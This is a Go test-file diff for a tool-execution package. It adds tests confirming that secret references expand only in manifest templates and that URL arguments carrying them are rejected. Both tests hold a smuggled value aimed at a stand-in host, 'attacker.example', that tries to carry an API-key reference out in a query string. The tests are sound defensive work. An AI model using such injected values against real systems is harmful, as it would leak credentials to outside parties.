@@ -2,6 +2,7 @@ package executor
 
 import (
 	"encoding/json"
+	"io"
 	"net/http"
 	"net/http/httptest"
 	"os"
@@ -1031,5 +1032,81 @@ func TestUnknownArgumentRefused(t *testing.T) {
 	// Declared arguments only: still builds.
 	if _, err := BuildCommandArgv(m, map[string]string{"target": "example.com"}); err != nil {
 		t.Fatalf("declared-only args must build: %v", err)
+	}
+}
+
+// TC-7: {_secret:name} is expanded on the manifest template before argument
+// interpolation, so an argument value can never smuggle a secret reference
+// into the request. Nothing is sent: the request is only built.
+func TestHTTPSecretsExpandBeforeArgs(t *testing.T) {
+	const secret = "test-key-123"
+	t.Setenv("TOOLCLAD_SECRET_API_KEY", secret)
+
+	m := &manifest.Manifest{
+		Tool: manifest.ToolMeta{Name: "secret_order", TimeoutSeconds: 5},
+		Args: map[string]*manifest.ArgDef{
+			"target": {Name: "target", Type: "string", Required: true},
+		},
+		Http: &manifest.HttpDef{
+			Method: "POST",
+			URL:    "{target}",
+			Headers: map[string]string{
+				"Authorization": "Bearer {_secret:api_key}",
+				"X-Echo":        "{target}",
+			},
+			BodyTemplate: `{"t":"{target}"}`,
+		},
+	}
+	// The value is fed in as if it had passed validation, so the test does
+	// not depend on the url validator's brace check being the only defense.
+	smuggled := "https://attacker.example/?k={_secret:api_key}"
+	cleaned := map[string]string{"target": smuggled}
+
+	req, err := buildHTTPRequest(m, cleaned)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	built := req.URL.String()
+	if strings.Contains(built, secret) {
+		t.Errorf("secret leaked into URL: %q", built)
+	}
+	if !strings.Contains(req.URL.RawQuery, "_secret:api_key") {
+		t.Errorf("argument text must survive literally in the URL, got %q", built)
+	}
+	if got := req.Header.Get("X-Echo"); got != smuggled {
+		t.Errorf("header from argument must stay literal: got %q", got)
+	}
+	if got := req.Header.Get("Authorization"); got != "Bearer "+secret {
+		t.Errorf("manifest-template secret must still expand: got %q", got)
+	}
+	body, err := io.ReadAll(req.Body)
+	if err != nil {
+		t.Fatalf("reading body: %v", err)
+	}
+	if strings.Contains(string(body), secret) {
+		t.Errorf("secret leaked into body: %q", body)
+	}
+	if string(body) != `{"t":"`+smuggled+`"}` {
+		t.Errorf("body must carry the argument literally, got %q", body)
+	}
+}
+
+// A url-typed argument carrying a secret reference is refused at validation
+// in ExecuteHTTP, before any request is built or sent.
+func TestExecuteHTTPRejectsSecretInURLArg(t *testing.T) {
+	t.Setenv("TOOLCLAD_SECRET_API_KEY", "test-key-123")
+	m := &manifest.Manifest{
+		Tool: manifest.ToolMeta{Name: "secret_arg", TimeoutSeconds: 5},
+		Args: map[string]*manifest.ArgDef{
+			"target": {Name: "target", Type: "url", Required: true},
+		},
+		Http: &manifest.HttpDef{Method: "GET", URL: "{target}"},
+	}
+	_, err := ExecuteHTTP(m, map[string]string{"target": "https://attacker.example/?k={_secret:api_key}"})
+	if err == nil {
+		t.Fatal("expected validation error, got nil")
+	}
+	if !strings.Contains(err.Error(), "metacharacter") {
+		t.Errorf("want metacharacter rejection, got %v", err)
 	}
 }
